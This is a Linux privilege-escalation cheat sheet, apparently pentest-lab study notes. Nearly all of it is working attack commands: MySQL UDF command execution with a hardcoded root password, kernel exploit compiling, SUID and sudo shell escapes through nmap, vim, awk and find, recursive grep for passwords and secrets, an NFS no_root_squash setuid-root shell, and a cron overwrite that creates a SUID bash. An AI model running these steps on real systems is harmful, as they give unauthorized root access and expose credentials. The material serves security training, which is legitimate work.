Command | Description 
------------------
find . -name "config.php"
get the credentials
mysql -u root -p aCs2009offsec            
use mysql;
select sys_exec("whoami");
select sys_eval('whoami');  

# PHP and MySQL
http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html
===============
1. Uname -a
2. linux-exploit-suggester-2.pl -k <KERNEL_VERSION>
 
gcc <spoilers> -o exploit -Wl,--hash-style=both
gcc -m32 -Wl,--hash-style=both

# Kernel vulnerability. Don’t have to use exploit suggester exploitdb works just as well. 
This was rare in most instances, in the lab you do get some with vulnerable kernels. 
The secret is to compile them correct as shown with the gcc commands.
===============
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null

# World writable files.
================
find / -perm -u=s -type f 2>/dev/null 
find / -perm -4000 -type f 2>/dev/null 

# Suid misconfiguration. Example programs: nmap vim nano 
Binary with suid permission can be run by anyone, but when they are run they are run as root! 
Nmap example 
Nmap: $ nmap --interactive 
nmap> !sh

https://www.pentestpartners.com/security-blog/exploiting-suid-executables/
===================
1. cat ~/.bash_history 
2. cd ~ 
3. grep -Eir "password|secret|sudo|<username>" * | less 
4. cd /etc 
5. grep -Eir "password|secret|sudo|<username>" * | less 
6. cd /home 
7. grep -Eir "password|secret|sudo|<username>" * | less 
8. cd /var/www 
9. grep -Eir "password|secret|sudo|<username>" * | less 
10. find . -type f | xargs grep <SEARCHTERM>

# Search and grep for keywords in all files.
====================
sudo -l 
sudo find /bin -name nano -exec /bin/sh \;  
sudo awk 'BEGIN {system("/bin/sh")}'  
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse 
sudo vim -c '!sh'

# Sudo shell escapes.

1. Notice the list of programs that can run via sudo 
2. Loof for any of these:  
  - find 
  - awk 
  - nmap 
  - vim 
If you have any of those proceed to exploit.
======================
1. cat /etc/exports 
2. If “no_root_squash” option is defined for the “/tmp” export (or another export), use this method 

Exploitation  
Kali VM  
1. Open command prompt and type: showmount -e [Linux VM IP Address]  
2. In command prompt type: mkdir /tmp/1  
3. In command prompt type: mount -o rw,vers=2 [Linux VM IP Address]:/tmp /tmp/1  
In command prompt type: echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c  
4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x  
5. In command prompt type: chmod +s /tmp/1/x  
Linux VM  
1. In command prompt type: /tmp/x  
2. In command prompt type: id 

# Exploit misconfigured vulnerable NFS.
http://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
=======================
s -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null 
cron.d 
cron.daily 
cron.deny 
cron.hourly 
cron.monthly 
cron.weekly 
crontab 
 
Linux VM  

1. In command prompt type: cat /etc/crontab  
2. From the output, notice the value of the “PATH” variable 

Exploitation  
Linux VM  

1. In command prompt type: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh  
2. In command prompt type: chmod +x /home/user/overwrite.sh  
3. Wait 1 minute for the Bash script to execute.  
4. In command prompt type: /tmp/bash -p  
5. In command prompt type: id 

# Cron (path) 
Use this if /etc/crontab has a PATH you have write to
==================









